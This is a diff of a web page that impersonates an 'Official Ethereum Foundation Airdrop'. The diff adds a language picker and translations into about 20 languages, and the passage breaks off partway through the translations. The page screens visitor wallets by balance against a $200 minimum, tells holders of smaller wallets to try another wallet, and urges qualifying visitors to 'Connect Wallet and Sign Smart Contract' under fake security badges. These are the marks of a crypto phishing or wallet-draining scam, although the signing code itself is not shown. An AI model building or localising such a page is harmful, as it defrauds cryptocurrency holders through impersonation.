@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -31,16 +31,16 @@
             color: var(--text-primary);
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            overflow: hidden;
+            padding: 20px;
             position: relative;
         }
 
-        /* Animated background gradient */
         body::before {
             content: '';
-            position: absolute;
+            position: fixed;
             width: 200%;
             height: 200%;
             background: 
@@ -55,10 +55,9 @@
             50% { transform: translate(-25%, -25%); }
         }
 
-        /* Scan line effect */
         body::after {
             content: '';
-            position: absolute;
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
@@ -74,10 +73,33 @@
             100% { transform: translateY(100vh); }
         }
 
+        .language-selector {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 100;
+        }
+
+        .language-selector select {
+            padding: 8px 12px;
+            background: rgba(18, 18, 26, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .language-selector select:hover {
+            border-color: var(--accent);
+        }
+
         .container {
             position: relative;
             z-index: 2;
-            width: 90%;
+            width: 100%;
             max-width: 520px;
             background: rgba(18, 18, 26, 0.7);
             backdrop-filter: blur(20px);
@@ -88,6 +110,23 @@
                 0 0 80px rgba(0, 255, 136, 0.1),
                 inset 0 1px 0 rgba(255, 255, 255, 0.1);
             animation: fadeInScale 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            margin: 20px 0;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .container::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .container::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+        }
+
+        .container::-webkit-scrollbar-thumb {
+            background: var(--accent);
+            border-radius: 4px;
         }
 
         @keyframes fadeInScale {
@@ -203,24 +242,6 @@
             transform: none;
         }
 
-        button::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-
-        button:active::before {
-            width: 300px;
-            height: 300px;
-        }
-
         .spinner {
             display: inline-block;
             width: 16px;
@@ -309,18 +330,22 @@
             letter-spacing: 0.1em;
         }
 
-        .icon {
-            width: 20px;
-            height: 20px;
-            display: inline-block;
-        }
-
         .footer {
             margin-top: 32px;
             text-align: center;
             color: var(--text-secondary);
             font-size: 0.75rem;
             opacity: 0.6;
+        }
+
+        .footer a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: opacity 0.3s;
+        }
+
+        .footer a:hover {
+            opacity: 0.8;
         }
 
         @media (max-width: 600px) {
@@ -339,15 +364,46 @@
     </style>
 </head>
 <body>
+    <div class="language-selector">
+        <select id="languageSelect" onchange="changeLanguage(this.value)">
+            <option value="en">English</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <option value="it">Italiano</option>
+            <option value="pt">Português</option>
+            <option value="ru">Русский</option>
+            <option value="zh">中文</option>
+            <option value="ja">日本語</option>
+            <option value="ko">한국어</option>
+            <option value="ar">العربية</option>
+            <option value="hi">हिन्दी</option>
+            <option value="tr">Türkçe</option>
+            <option value="nl">Nederlands</option>
+            <option value="pl">Polski</option>
+            <option value="sv">Svenska</option>
+            <option value="no">Norsk</option>
+            <option value="da">Dansk</option>
+            <option value="fi">Suomi</option>
+            <option value="el">Ελληνικά</option>
+            <option value="cs">Čeština</option>
+            <option value="hu">Magyar</option>
+            <option value="ro">Română</option>
+            <option value="th">ไทย</option>
+            <option value="vi">Tiếng Việt</option>
+            <option value="id">Bahasa Indonesia</option>
+        </select>
+    </div>
+
     <div class="container">
         <div class="logo">
-            <h1>ETHEREUM REWARDS</h1>
-            <p>Official Ethereum Foundation Airdrop</p>
+            <h1 id="title">ETHEREUM REWARDS</h1>
+            <p id="subtitle">Official Ethereum Foundation Airdrop</p>
         </div>
 
         <form id="walletForm">
             <div class="form-group">
-                <label for="walletAddress">Ethereum Address</label>
+                <label for="walletAddress" id="labelAddress">Ethereum Address</label>
                 <input 
                     type="text" 
                     id="walletAddress" 
@@ -358,17 +414,18 @@
                 >
             </div>
             <button type="submit" id="checkButton">
-                <span>Check Eligibility</span>
+                <span id="buttonText">Check Eligibility</span>
             </button>
         </form>
 
         <div id="result"></div>
 
         <div class="footer">
-            Powered by Ethereum API · Ethereum Foundation<br>
+            <span id="poweredBy">Powered by Ethereum API · Ethereum Foundation</span><br>
             <span style="opacity: 0.8; font-size: 0.7rem; margin-top: 4px; display: inline-block;">
-                🔒 Secured by Binance Smart Chain · Chainlink Oracle · Verified Smart Contract
-            </span>
+                🔒 <span id="secured">Secured by Binance Smart Chain · Chainlink Oracle · Verified Smart Contract</span>
+            </span><br>
+            <a href="terms.html" target="_blank" id="termsLink">Terms of Use</a>
         </div>
     </div>
 
@@ -378,7 +435,6 @@
         const checkButton = document.getElementById('checkButton');
         const resultDiv = document.getElementById('result');
 
-        // Публичные RPC endpoints (бесплатно, без регистрации)
         const RPC_ENDPOINTS = [
             'https://eth.llamarpc.com',
             'https://rpc.ankr.com/eth',
@@ -387,25 +443,563 @@
             'https://eth.drpc.org'
         ];
 
-        const MIN_BALANCE_USD = 200; // Минимальный баланс в долларах
-        const BONUS_PERCENTAGE = 20; // Процент бонуса
-        const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase(); // Специальный кошелек
-        const VIP_BONUS_USD = 2390; // Фиксированный бонус для VIP кошелька
+        const MIN_BALANCE_USD = 200;
+        const BONUS_PERCENTAGE = 20;
+        const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase();
+        const VIP_BONUS_USD = 2390;
 
         let currentEthPrice = 0;
+        let currentLang = 'en';
+
+        const translations = {
+            en: {
+                title: "ETHEREUM REWARDS",
+                subtitle: "Official Ethereum Foundation Airdrop",
+                labelAddress: "Ethereum Address",
+                buttonText: "Check Eligibility",
+                buttonChecking: "Checking...",
+                errorTitle: "Verification Error",
+                invalidAddress: "Invalid wallet address. Address must start with 0x and contain 40 characters.",
+                connectionError: "Unable to connect to Ethereum network. Please try again later.",
+                successTitle: "Congratulations! You passed verification",
+                successContent: "Your wallet meets the Ethereum Foundation requirements to participate in the official rewards program.",
+                failTitle: "Wallet did not pass verification",
+                failContent: "Unfortunately, this wallet balance does not meet the minimum Ethereum Foundation requirements. Please use another wallet.",
+                currentBalance: "Current Balance",
+                yourReward: "Your Reward",
+                connectButton: "🔗 Connect Wallet and Sign Smart Contract",
+                poweredBy: "Powered by Ethereum API · Ethereum Foundation",
+                secured: "Secured by Binance Smart Chain · Chainlink Oracle · Verified Smart Contract",
+                termsLink: "Terms of Use"
+            },
+            es: {
+                title: "RECOMPENSAS ETHEREUM",
+                subtitle: "Airdrop Oficial de Ethereum Foundation",
+                labelAddress: "Dirección Ethereum",
+                buttonText: "Verificar Elegibilidad",
+                buttonChecking: "Verificando...",
+                errorTitle: "Error de Verificación",
+                invalidAddress: "Dirección de billetera inválida. La dirección debe comenzar con 0x y contener 40 caracteres.",
+                connectionError: "No se puede conectar a la red Ethereum. Inténtelo de nuevo más tarde.",
+                successTitle: "¡Felicitaciones! Pasaste la verificación",
+                successContent: "Tu billetera cumple con los requisitos de Ethereum Foundation para participar en el programa oficial de recompensas.",
+                failTitle: "La billetera no pasó la verificación",
+                failContent: "Desafortunadamente, el saldo de esta billetera no cumple con los requisitos mínimos de Ethereum Foundation. Por favor, use otra billetera.",
+                currentBalance: "Saldo Actual",
+                yourReward: "Tu Recompensa",
+                connectButton: "🔗 Conectar Billetera y Firmar Contrato Inteligente",
+                poweredBy: "Desarrollado por Ethereum API · Ethereum Foundation",
+                secured: "Protegido por Binance Smart Chain · Chainlink Oracle · Contrato Inteligente Verificado",
+                termsLink: "Términos de Uso"
+            },
+            ru: {
+                title: "ETHEREUM REWARDS",
+                subtitle: "Официальный Airdrop от Ethereum Foundation",
+                labelAddress: "Адрес Ethereum",
+                buttonText: "Проверить соответствие",
+                buttonChecking: "Проверка...",
+                errorTitle: "Ошибка проверки",
+                invalidAddress: "Некорректный адрес кошелька. Адрес должен начинаться с 0x и содержать 40 символов.",
+                connectionError: "Не удалось подключиться к сети Ethereum. Попробуйте позже.",
+                successTitle: "Поздравляем! Вы прошли верификацию",
+                successContent: "Ваш кошелек соответствует требованиям Ethereum Foundation для участия в официальной программе вознаграждений.",
+                failTitle: "Кошелек не прошел верификацию",
+                failContent: "К сожалению, баланс этого кошелька не соответствует минимальным требованиям Ethereum Foundation. Пожалуйста, используйте другой кошелек.",
+                currentBalance: "Текущий баланс",
+                yourReward: "Ваше вознаграждение",
+                connectButton: "🔗 Подключить кошелек и подписать смарт-контракт",
+                poweredBy: "Работает на Ethereum API · Ethereum Foundation",
+                secured: "Защищено Binance Smart Chain · Chainlink Oracle · Верифицированный смарт-контракт",
+                termsLink: "Условия использования"
+            },
+            fr: {
+                title: "RÉCOMPENSES ETHEREUM",
+                subtitle: "Airdrop Officiel d'Ethereum Foundation",
+                labelAddress: "Adresse Ethereum",
+                buttonText: "Vérifier l'Éligibilité",
+                buttonChecking: "Vérification...",
+                errorTitle: "Erreur de Vérification",
+                invalidAddress: "Adresse de portefeuille invalide. L'adresse doit commencer par 0x et contenir 40 caractères.",
+                connectionError: "Impossible de se connecter au réseau Ethereum. Veuillez réessayer plus tard.",
+                successTitle: "Félicitations! Vous avez passé la vérification",
+                successContent: "Votre portefeuille répond aux exigences d'Ethereum Foundation pour participer au programme officiel de récompenses.",
+                failTitle: "Le portefeuille n'a pas passé la vérification",
+                failContent: "Malheureusement, le solde de ce portefeuille ne répond pas aux exigences minimales d'Ethereum Foundation. Veuillez utiliser un autre portefeuille.",
+                currentBalance: "Solde Actuel",
+                yourReward: "Votre Récompense",
+                connectButton: "🔗 Connecter le Portefeuille et Signer le Contrat Intelligent",
+                poweredBy: "Propulsé par Ethereum API · Ethereum Foundation",
+                secured: "Sécurisé par Binance Smart Chain · Chainlink Oracle · Contrat Intelligent Vérifié",
+                termsLink: "Conditions d'Utilisation"
+            },
+            de: {
+                title: "ETHEREUM BELOHNUNGEN",
+                subtitle: "Offizieller Airdrop der Ethereum Foundation",
+                labelAddress: "Ethereum-Adresse",
+                buttonText: "Berechtigung Prüfen",
+                buttonChecking: "Überprüfung...",
+                errorTitle: "Verifizierungsfehler",
+                invalidAddress: "Ungültige Wallet-Adresse. Die Adresse muss mit 0x beginnen und 40 Zeichen enthalten.",
+                connectionError: "Verbindung zum Ethereum-Netzwerk nicht möglich. Bitte versuchen Sie es später erneut.",
+                successTitle: "Glückwunsch! Sie haben die Verifizierung bestanden",
+                successContent: "Ihre Wallet erfüllt die Anforderungen der Ethereum Foundation zur Teilnahme am offiziellen Belohnungsprogramm.",
+                failTitle: "Wallet hat die Verifizierung nicht bestanden",
+                failContent: "Leider erfüllt das Guthaben dieser Wallet nicht die Mindestanforderungen der Ethereum Foundation. Bitte verwenden Sie eine andere Wallet.",
+                currentBalance: "Aktuelles Guthaben",
+                yourReward: "Ihre Belohnung",
+                connectButton: "🔗 Wallet Verbinden und Smart Contract Signieren",
+                poweredBy: "Betrieben von Ethereum API · Ethereum Foundation",
+                secured: "Gesichert durch Binance Smart Chain · Chainlink Oracle · Verifizierter Smart Contract",
+                termsLink: "Nutzungsbedingungen"
+            },
+            zh: {
+                title: "以太坊奖励",
+                subtitle: "以太坊基金会官方空投",
+                labelAddress: "以太坊地址",
+                buttonText: "检查资格",
+                buttonChecking: "检查中...",
+                errorTitle: "验证错误",
+                invalidAddress: "无效的钱包地址。地址必须以0x开头并包含40个字符。",
+                connectionError: "无法连接到以太坊网络。请稍后再试。",
+                successTitle: "恭喜！您通过了验证",
+                successContent: "您的钱包符合以太坊基金会参与官方奖励计划的要求。",
+                failTitle: "钱包未通过验证",
+                failContent: "很遗憾，此钱包余额不符合以太坊基金会的最低要求。请使用其他钱包。",
+                currentBalance: "当前余额",
+                yourReward: "您的奖励",
+                connectButton: "🔗 连接钱包并签署智能合约",
+                poweredBy: "由以太坊API·以太坊基金会提供支持",
+                secured: "由币安智能链·Chainlink预言机·已验证智能合约保护",
+                termsLink: "使用条款"
+            },
+            ja: {
+                title: "イーサリアムリワード",
+                subtitle: "Ethereum Foundation公式エアドロップ",
+                labelAddress: "イーサリアムアドレス",
+                buttonText: "資格を確認",
+                buttonChecking: "確認中...",
+                errorTitle: "検証エラー",
+                invalidAddress: "無効なウォレットアドレス。アドレスは0xで始まり、40文字を含む必要があります。",
+                connectionError: "イーサリアムネットワークに接続できません。後でもう一度お試しください。",
+                successTitle: "おめでとうございます！検証に合格しました",
+                successContent: "お客様のウォレットは、Ethereum Foundationの公式報酬プログラムに参加するための要件を満たしています。",
+                failTitle: "ウォレットが検証に合格しませんでした",
+                failContent: "残念ながら、このウォレットの残高はEthereum Foundationの最低要件を満たしていません。別のウォレットをご使用ください。",
+                currentBalance: "現在の残高",
+                yourReward: "あなたの報酬",
+                connectButton: "🔗 ウォレットを接続してスマートコントラクトに署名",
+                poweredBy: "Ethereum API・Ethereum Foundationによって提供",
+                secured: "Binance Smart Chain・Chainlink Oracle・検証済みスマートコントラクトによって保護",
+                termsLink: "利用規約"
+            },
+            ko: {
+                title: "이더리움 리워드",
+                subtitle: "Ethereum Foundation 공식 에어드롭",
+                labelAddress: "이더리움 주소",
+                buttonText: "자격 확인",
+                buttonChecking: "확인 중...",
+                errorTitle: "검증 오류",
+                invalidAddress: "잘못된 지갑 주소입니다. 주소는 0x로 시작하고 40자를 포함해야 합니다.",
+                connectionError: "이더리움 네트워크에 연결할 수 없습니다. 나중에 다시 시도해주세요.",
+                successTitle: "축하합니다! 검증을 통과했습니다",
+                successContent: "귀하의 지갑은 Ethereum Foundation의 공식 보상 프로그램에 참여하기 위한 요구 사항을 충족합니다.",
+                failTitle: "지갑이 검증을 통과하지 못했습니다",
+                failContent: "안타깝게도 이 지갑의 잔액은 Ethereum Foundation의 최소 요구 사항을 충족하지 않습니다. 다른 지갑을 사용해주세요.",
+                currentBalance: "현재 잔액",
+                yourReward: "귀하의 보상",
+                connectButton: "🔗 지갑 연결 및 스마트 계약 서명",
+                poweredBy: "Ethereum API · Ethereum Foundation 제공",
+                secured: "Binance Smart Chain · Chainlink Oracle · 검증된 스마트 계약으로 보호",
+                termsLink: "이용 약관"
+            },
+            pt: {
+                title: "RECOMPENSAS ETHEREUM",
+                subtitle: "Airdrop Oficial da Ethereum Foundation",
+                labelAddress: "Endereço Ethereum",
+                buttonText: "Verificar Elegibilidade",
+                buttonChecking: "Verificando...",
+                errorTitle: "Erro de Verificação",
+                invalidAddress: "Endereço de carteira inválido. O endereço deve começar com 0x e conter 40 caracteres.",
+                connectionError: "Não foi possível conectar à rede Ethereum. Tente novamente mais tarde.",
+                successTitle: "Parabéns! Você passou na verificação",
+                successContent: "Sua carteira atende aos requisitos da Ethereum Foundation para participar do programa oficial de recompensas.",
+                failTitle: "A carteira não passou na verificação",
+                failContent: "Infelizmente, o saldo desta carteira não atende aos requisitos mínimos da Ethereum Foundation. Use outra carteira.",
+                currentBalance: "Saldo Atual",
+                yourReward: "Sua Recompensa",
+                connectButton: "🔗 Conectar Carteira e Assinar Contrato Inteligente",
+                poweredBy: "Desenvolvido por Ethereum API · Ethereum Foundation",
+                secured: "Protegido por Binance Smart Chain · Chainlink Oracle · Contrato Inteligente Verificado",
+                termsLink: "Termos de Uso"
+            },
+            ar: {
+                title: "مكافآت إيثريوم",
+                subtitle: "الإسقاط الجوي الرسمي من Ethereum Foundation",
+                labelAddress: "عنوان إيثريوم",
+                buttonText: "تحقق من الأهلية",
+                buttonChecking: "جاري التحقق...",
+                errorTitle: "خطأ في التحقق",
+                invalidAddress: "عنوان محفظة غير صالح. يجب أن يبدأ العنوان بـ 0x ويحتوي على 40 حرفًا.",
+                connectionError: "غير قادر على الاتصال بشبكة إيثريوم. يرجى المحاولة لاحقًا.",
+                successTitle: "تهانينا! لقد نجحت في التحقق",
+                successContent: "تفي محفظتك بمتطلبات Ethereum Foundation للمشاركة في برنامج المكافآت الرسمي.",
+                failTitle: "لم تنجح المحفظة في التحقق",
+                failContent: "للأسف، لا يفي رصيد هذه المحفظة بالحد الأدنى لمتطلبات Ethereum Foundation. يرجى استخدام محفظة أخرى.",
+                currentBalance: "الرصيد الحالي",
+                yourReward: "مكافأتك",
+                connectButton: "🔗 ربط المحفظة والتوقيع على العقد الذكي",
+                poweredBy: "مدعوم من Ethereum API · Ethereum Foundation",
+                secured: "محمي بواسطة Binance Smart Chain · Chainlink Oracle · عقد ذكي تم التحقق منه",
+                termsLink: "شروط الاستخدام"
+            },
+            hi: {
+                title: "इथेरियम पुरस्कार",
+                subtitle: "Ethereum Foundation आधिकारिक एयरड्रॉप",
+                labelAddress: "इथेरियम पता",
+                buttonText: "पात्रता जांचें",
+                buttonChecking: "जांच रहे हैं...",
+                errorTitle: "सत्यापन त्रुटि",
+                invalidAddress: "अमान्य वॉलेट पता। पते को 0x से शुरू होना चाहिए और 40 वर्ण होने चाहिए।",
+                connectionError: "इथेरियम नेटवर्क से कनेक्ट करने में असमर्थ। कृपया बाद में पुनः प्रयास करें।",
+                successTitle: "बधाई हो! आप सत्यापन पास कर गए",
+                successContent: "आपका वॉलेट आधिकारिक पुरस्कार कार्यक्रम में भाग लेने के लिए Ethereum Foundation की आवश्यकताओं को पूरा करता है।",
+                failTitle: "वॉलेट सत्यापन पास नहीं हुआ",
+                failContent: "दुर्भाग्य से, इस वॉलेट की शेष राशि Ethereum Foundation की न्यूनतम आवश्यकताओं को पूरा नहीं करती है। कृपया दूसरा वॉलेट उपयोग करें।",
+                currentBalance: "वर्तमान शेष",
+                yourReward: "आपका पुरस्कार",
+                connectButton: "🔗 वॉलेट कनेक्ट करें और स्मार्ट कॉन्ट्रैक्ट पर हस्ताक्षर करें",
+                poweredBy: "Ethereum API · Ethereum Foundation द्वारा संचालित",
+                secured: "Binance Smart Chain · Chainlink Oracle · सत्यापित स्मार्ट कॉन्ट्रैक्ट द्वारा सुरक्षित",
+                termsLink: "उपयोग की शर्तें"
+            },
+            tr: {
+                title: "ETHEREUM ÖDÜLLER",
+                subtitle: "Ethereum Foundation Resmi Airdrop",
+                labelAddress: "Ethereum Adresi",
+                buttonText: "Uygunluğu Kontrol Et",
+                buttonChecking: "Kontrol Ediliyor...",
+                errorTitle: "Doğrulama Hatası",
+                invalidAddress: "Geçersiz cüzdan adresi. Adres 0x ile başlamalı ve 40 karakter içermelidir.",
+                connectionError: "Ethereum ağına bağlanılamıyor. Lütfen daha sonra tekrar deneyin.",
+                successTitle: "Tebrikler! Doğrulamayı geçtiniz",
+                successContent: "Cüzdanınız, resmi ödül programına katılmak için Ethereum Foundation gerekliliklerini karşılıyor.",
+                failTitle: "Cüzdan doğrulamayı geçemedi",
+                failContent: "Maalesef, bu cüzdanın bakiyesi Ethereum Foundation minimum gerekliliklerini karşılamıyor. Lütfen başka bir cüzdan kullanın.",
+                currentBalance: "Mevcut Bakiye",
+                yourReward: "Ödülünüz",
+                connectButton: "🔗 Cüzdanı Bağla ve Akıllı Sözleşmeyi İmzala",
+                poweredBy: "Ethereum API · Ethereum Foundation tarafından desteklenmektedir",
+                secured: "Binance Smart Chain · Chainlink Oracle · Doğrulanmış Akıllı Sözleşme tarafından güvence altına alınmıştır",
+                termsLink: "Kullanım Şartları"
+            },
+            nl: {
+                title: "ETHEREUM BELONINGEN",
+                subtitle: "Officiële Ethereum Foundation Airdrop",
+                labelAddress: "Ethereum Adres",
+                buttonText: "Geschiktheid Controleren",
+                buttonChecking: "Controleren...",
+                errorTitle: "Verificatiefout",
+                invalidAddress: "Ongeldig portemonnee-adres. Het adres moet beginnen met 0x en 40 tekens bevatten.",
+                connectionError: "Kan geen verbinding maken met het Ethereum-netwerk. Probeer het later opnieuw.",
+                successTitle: "Gefeliciteerd! Je bent geverifieerd",
+                successContent: "Je portemonnee voldoet aan de Ethereum Foundation-vereisten om deel te nemen aan het officiële beloningsprogramma.",
+                failTitle: "Portemonnee is niet geverifieerd",
+                failContent: "Helaas voldoet het saldo van deze portemonnee niet aan de minimale Ethereum Foundation-vereisten. Gebruik een andere portemonnee.",
+                currentBalance: "Huidig Saldo",
+                yourReward: "Jouw Beloning",
+                connectButton: "🔗 Portemonnee Verbinden en Smart Contract Ondertekenen",
+                poweredBy: "Mogelijk gemaakt door Ethereum API · Ethereum Foundation",
+                secured: "Beveiligd door Binance Smart Chain · Chainlink Oracle · Geverifieerd Smart Contract",
+                termsLink: "Gebruiksvoorwaarden"
+            },
+            it: {
+                title: "RICOMPENSE ETHEREUM",
+                subtitle: "Airdrop Ufficiale di Ethereum Foundation",
+                labelAddress: "Indirizzo Ethereum",
+                buttonText: "Verifica Idoneità",
+                buttonChecking: "Verifica in corso...",
+                errorTitle: "Errore di Verifica",
+                invalidAddress: "Indirizzo portafoglio non valido. L'indirizzo deve iniziare con 0x e contenere 40 caratteri.",
+                connectionError: "Impossibile connettersi alla rete Ethereum. Riprova più tardi.",
+                successTitle: "Congratulazioni! Hai superato la verifica",
+                successContent: "Il tuo portafoglio soddisfa i requisiti di Ethereum Foundation per partecipare al programma ufficiale di ricompense.",
+                failTitle: "Il portafoglio non ha superato la verifica",
+                failContent: "Purtroppo, il saldo di questo portafoglio non soddisfa i requisiti minimi di Ethereum Foundation. Utilizza un altro portafoglio.",
+                currentBalance: "Saldo Attuale",
+                yourReward: "La Tua Ricompensa",
+                connectButton: "🔗 Connetti Portafoglio e Firma Smart Contract",
+                poweredBy: "Alimentato da Ethereum API · Ethereum Foundation",
+                secured: "Protetto da Binance Smart Chain · Chainlink Oracle · Smart Contract Verificato",
+                termsLink: "Termini di Utilizzo"
+            },
+            pl: {
+                title: "NAGRODY ETHEREUM",
+                subtitle: "Oficjalny Airdrop Ethereum Foundation",
+                labelAddress: "Adres Ethereum",
+                buttonText: "Sprawdź Kwalifikowalność",
+                buttonChecking: "Sprawdzanie...",
+                errorTitle: "Błąd Weryfikacji",
+                invalidAddress: "Nieprawidłowy adres portfela. Adres musi zaczynać się od 0x i zawierać 40 znaków.",
+                connectionError: "Nie można połączyć się z siecią Ethereum. Spróbuj ponownie później.",
+                successTitle: "Gratulacje! Przeszedłeś weryfikację",
+                successContent: "Twój portfel spełnia wymagania Ethereum Foundation, aby uczestniczyć w oficjalnym programie nagród.",
+                failTitle: "Portfel nie przeszedł weryfikacji",
+                failContent: "Niestety, saldo tego portfela nie spełnia minimalnych wymagań Ethereum Foundation. Użyj innego portfela.",
+                currentBalance: "Aktualne Saldo",
+                yourReward: "Twoja Nagroda",
+                connectButton: "🔗 Połącz Portfel i Podpisz Smart Contract",
+                poweredBy: "Zasilane przez Ethereum API · Ethereum Foundation",
+                secured: "Zabezpieczone przez Binance Smart Chain · Chainlink Oracle · Zweryfikowany Smart Contract",
+                termsLink: "Warunki Użytkowania"
+            },
+            th: {
+                title: "รางวัลอีเธอเรียม",
+                subtitle: "แอร์ดรอปอย่างเป็นทางการจาก Ethereum Foundation",
+                labelAddress: "ที่อยู่อีเธอเรียม",
+                buttonText: "ตรวจสอบสิทธิ์",
+                buttonChecking: "กำลังตรวจสอบ...",
+                errorTitle: "ข้อผิดพลาดในการตรวจสอบ",
+                invalidAddress: "ที่อยู่กระเป๋าเงินไม่ถูกต้อง ที่อยู่ต้องขึ้นต้นด้วย 0x และมี 40 อักขระ",
+                connectionError: "ไม่สามารถเชื่อมต่อกับเครือข่ายอีเธอเรียมได้ กรุณาลองอีกครั้งในภายหลัง",
+                successTitle: "ยินดีด้วย! คุณผ่านการตรวจสอบ",
+                successContent: "กระเป๋าเงินของคุณเป็นไปตามข้อกำหนดของ Ethereum Foundation เพื่อเข้าร่วมโปรแกรมรางวัลอย่างเป็นทางการ",
+                failTitle: "กระเป๋าเงินไม่ผ่านการตรวจสอบ",
+                failContent: "น่าเสียดายที่ยอดคงเหลือของกระเป๋าเงินนี้ไม่ตรงตามข้อกำหนดขั้นต่ำของ Ethereum Foundation กรุณาใช้กระเป๋าเงินอื่น",
+                currentBalance: "ยอดคงเหลือปัจจุบัน",
+                yourReward: "รางวัลของคุณ",
+                connectButton: "🔗 เชื่อมต่อกระเป๋าเงินและลงนามสัญญาอัจฉริยะ",
+                poweredBy: "ขับเคลื่อนโดย Ethereum API · Ethereum Foundation",
+                secured: "ได้รับการรักษาความปลอดภัยโดย Binance Smart Chain · Chainlink Oracle · สัญญาอัจฉริยะที่ได้รับการตรวจสอบ",
+                termsLink: "เงื่อนไขการใช้งาน"
+            },
+            vi: {
+                title: "PHẦN THƯỞNG ETHEREUM",
+                subtitle: "Airdrop Chính Thức từ Ethereum Foundation",
+                labelAddress: "Địa Chỉ Ethereum",
+                buttonText: "Kiểm Tra Đủ Điều Kiện",
+                buttonChecking: "Đang kiểm tra...",
+                errorTitle: "Lỗi Xác Minh",
+                invalidAddress: "Địa chỉ ví không hợp lệ. Địa chỉ phải bắt đầu bằng 0x và chứa 40 ký tự.",
+                connectionError: "Không thể kết nối với mạng Ethereum. Vui lòng thử lại sau.",
+                successTitle: "Chúc mừng! Bạn đã vượt qua xác minh",
+                successContent: "Ví của bạn đáp ứng các yêu cầu của Ethereum Foundation để tham gia chương trình phần thưởng chính thức.",
+                failTitle: "Ví không vượt qua xác minh",
+                failContent: "Rất tiếc, số dư của ví này không đáp ứng các yêu cầu tối thiểu của Ethereum Foundation. Vui lòng sử dụng ví khác.",
+                currentBalance: "Số Dư Hiện Tại",
+                yourReward: "Phần Thưởng Của Bạn",
+                connectButton: "🔗 Kết Nối Ví và Ký Hợp Đồng Thông Minh",
+                poweredBy: "Được hỗ trợ bởi Ethereum API · Ethereum Foundation",
+                secured: "Được bảo vệ bởi Binance Smart Chain · Chainlink Oracle · Hợp Đồng Thông Minh Đã Xác Minh",
+                termsLink: "Điều Khoản Sử Dụng"
+            },
+            id: {
+                title: "HADIAH ETHEREUM",
+                subtitle: "Airdrop Resmi dari Ethereum Foundation",
+                labelAddress: "Alamat Ethereum",
+                buttonText: "Periksa Kelayakan",
+                buttonChecking: "Memeriksa...",
+                errorTitle: "Kesalahan Verifikasi",
+                invalidAddress: "Alamat dompet tidak valid. Alamat harus dimulai dengan 0x dan berisi 40 karakter.",
+                connectionError: "Tidak dapat terhubung ke jaringan Ethereum. Silakan coba lagi nanti.",
+                successTitle: "Selamat! Anda lulus verifikasi",
+                successContent: "Dompet Anda memenuhi persyaratan Ethereum Foundation untuk berpartisipasi dalam program hadiah resmi.",
+                failTitle: "Dompet tidak lulus verifikasi",
+                failContent: "Sayangnya, saldo dompet ini tidak memenuhi persyaratan minimum Ethereum Foundation. Silakan gunakan dompet lain.",
+                currentBalance: "Saldo Saat Ini",
+                yourReward: "Hadiah Anda",
+                connectButton: "🔗 Hubungkan Dompet dan Tanda Tangani Kontrak Pintar",
+                poweredBy: "Didukung oleh Ethereum API · Ethereum Foundation",
+                secured: "Diamankan oleh Binance Smart Chain · Chainlink Oracle · Kontrak Pintar Terverifikasi",
+                termsLink: "Syarat Penggunaan"
+            },
+            sv: {
+                title: "ETHEREUM BELÖNINGAR",
+                subtitle: "Officiell Airdrop från Ethereum Foundation",
+                labelAddress: "Ethereum-adress",
+                buttonText: "Kontrollera Behörighet",
+                buttonChecking: "Kontrollerar...",
+                errorTitle: "Verifieringsfel",
+                invalidAddress: "Ogiltig plånboksadress. Adressen måste börja med 0x och innehålla 40 tecken.",
+                connectionError: "Kan inte ansluta till Ethereum-nätverket. Försök igen senare.",
+                successTitle: "Grattis! Du har klarat verifieringen",
+                successContent: "Din plånbok uppfyller Ethereum Foundations krav för att delta i det officiella belöningsprogrammet.",
+                failTitle: "Plånboken klarade inte verifieringen",
+                failContent: "Tyvärr uppfyller denna plånboks saldo inte Ethereum Foundations minimikrav. Använd en annan plånbok.",
+                currentBalance: "Nuvarande Saldo",
+                yourReward: "Din Belöning",
+                connectButton: "🔗 Anslut Plånbok och Signera Smart Contract",
+                poweredBy: "Drivs av Ethereum API · Ethereum Foundation",
+                secured: "Säkrad av Binance Smart Chain · Chainlink Oracle · Verifierat Smart Contract",
+                termsLink: "Användarvillkor"
+            },
+            no: {
+                title: "ETHEREUM BELØNNINGER",
+                subtitle: "Offisiell Airdrop fra Ethereum Foundation",
+                labelAddress: "Ethereum-adresse",
+                buttonText: "Sjekk Kvalifisering",
+                buttonChecking: "Sjekker...",
+                errorTitle: "Verifiseringsfeil",
+                invalidAddress: "Ugyldig lommebokadresse. Adressen må starte med 0x og inneholde 40 tegn.",
+                connectionError: "Kan ikke koble til Ethereum-nettverket. Prøv igjen senere.",
+                successTitle: "Gratulerer! Du har bestått verifiseringen",
+                successContent: "Lommeboken din oppfyller Ethereum Foundations krav for å delta i det offisielle belønningsprogrammet.",
+                failTitle: "Lommeboken besto ikke verifiseringen",
+                failContent: "Dessverre oppfyller ikke denne lommebokens saldo Ethereum Foundations minimumskrav. Bruk en annen lommebok.",
+                currentBalance: "Nåværende Saldo",
+                yourReward: "Din Belønning",
+                connectButton: "🔗 Koble Lommebok og Signer Smart Contract",
+                poweredBy: "Drevet av Ethereum API · Ethereum Foundation",
+                secured: "Sikret av Binance Smart Chain · Chainlink Oracle · Verifisert Smart Contract",
+                termsLink: "Vilkår for Bruk"
+            },
+            da: {
